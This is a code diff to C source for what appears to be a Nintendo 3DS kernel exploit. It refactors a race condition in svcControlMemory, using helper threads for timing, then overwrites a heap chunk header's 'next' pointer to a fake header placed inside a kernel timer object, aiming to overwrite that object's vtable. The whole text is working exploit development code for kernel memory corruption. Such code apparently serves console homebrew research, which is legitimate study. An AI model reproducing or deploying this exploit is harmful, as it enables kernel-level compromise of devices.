@@ -6,7 +6,7 @@
 
 #define PAGE_SIZE 0x1000
 
-typedef struct {
+typedef struct __attribute__((packed)) {
     void* vtable;
     u32 refCount;
     u32 syncedThreads;
@@ -84,7 +84,7 @@ static void allocate_thread(void* arg) {
 }
 
 // Maps pages with chunk headers present.
-static void map_raw_pages(u32 memAddr, u32 memSize) {
+static void begin_map_pages(u32 memAddr, u32 memSize) {
     // Reset control result.
     control_res = -1;
 
@@ -93,13 +93,15 @@ static void map_raw_pages(u32 memAddr, u32 memSize) {
     memInfo[0] = memAddr;
     memInfo[1] = memSize;
 
-    // Retrieve arbiter.
-    Handle arbiter = __sync_get_arbiter();
-
     // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
     threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
     // Create thread to allocate pages.
     threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);
+}
+
+static void wait_raw_mapped(u32 memAddr) {
+    // Retrieve arbiter.
+    Handle arbiter = __sync_get_arbiter();
 
     // Use svcArbitrateAddress to detect when the memory page has been mapped.
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
@@ -148,7 +150,8 @@ void do_hax() {
     // Debug output.
     printf("Mapping pages for read...\n");
 
-    map_raw_pages(memAddr, memSize);
+    begin_map_pages(memAddr, memSize);
+    wait_raw_mapped(memAddr);
     MemChunkHdr hdr = *(MemChunkHdr*) memAddr;
     wait_map_complete();
     svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
@@ -169,16 +172,26 @@ void do_hax() {
     MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
 
     // Debug output.
-    printf("Timer address: 0x%08X\n", (int) timerAddr);
+    printf("Timer object: 0x%08X\n", (int) timerObj);
+    printf("Fake header address: 0x%08X\n", (int) fakeHdr);
+
+    // Allocate a buffer for the kernel page backup.
+    //void* backup = malloc(PAGE_SIZE);
 
     // Debug output.
     printf("Mapping pages for overwrite...\n");
 
     // Map the pages.
-    map_raw_pages(memAddr, memSize);
+    begin_map_pages(memAddr, memSize);
 
     // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
+    wait_raw_mapped(memAddr);
     ((MemChunkHdr*) memAddr)->next = fakeHdr;
+
+    // Backup the kernel page before it is cleared.
+    //wait_raw_mapped(memAddr + PAGE_SIZE);
+    //printf("Value: %08X\n", *(int*) (memAddr + PAGE_SIZE));
+    //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
 
     // Debug output.
     printf("Post-overwrite control result: 0x%08X\n", (int) control_res);
@@ -191,7 +204,7 @@ void do_hax() {
 
     // Overwrite the timer's vtable with our own.
     // TODO: This needs to be a kernel virtual address.
-    //void*** vtablePtr = (void***) (memAddr + PAGE_SIZE + ((u32) timerObj - ((u32) timerObj & ~0xFFF)));
+    //void*** vtablePtr = (void***) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
     //*vtablePtr = vtable;
 
     // Free the timer.
